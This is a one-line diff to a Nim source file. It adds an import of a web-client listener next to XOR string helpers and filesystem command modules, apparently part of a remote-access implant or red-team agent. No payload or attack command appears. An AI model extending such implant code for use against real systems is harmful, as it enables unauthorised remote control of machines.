@@ -1,5 +1,6 @@
 import parsetoml, strutils, tables
 from ../util/crypto import xorStringToByteSeq, xorByteSeqToString
+from ../core/webClientListener import Listener
 
 # Filesystem operations
 include ../modules/filesystem/[cat, cd, cp, ls, mkdir, mv, pwd, rm]
